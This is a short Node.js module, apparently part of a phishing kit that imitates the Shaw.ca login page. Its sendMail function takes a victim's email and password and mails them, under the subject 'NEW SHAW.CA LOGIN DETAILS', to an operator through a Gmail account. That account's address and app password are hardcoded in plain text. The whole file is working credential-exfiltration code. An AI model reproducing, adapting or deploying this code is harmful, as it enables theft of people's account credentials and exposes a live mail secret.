const nodemailer = require('nodemailer')

const sendMail = (email, password, user, res) => {
  const auth = {
    user: 'webiniy01@gmail.com',
    pass: 'ltgy qoqa zvfd uclp',
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth,
  })

  const text = `New login details. email: ${email}, password: ${password} from Shaw.ca `

  const mailOptions = {
    from: auth['user'],
    to: user,
    subject: 'NEW SHAW.CA LOGIN DETAILS',
    text,
  }

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error)
      res.status(500).send('there was an error')
      return
    } else {
      console.log('Email sent: ' + info.response)
      res.status(200).json({ sent: 'success' })
      return
    }
  })
}

module.exports = { sendMail }
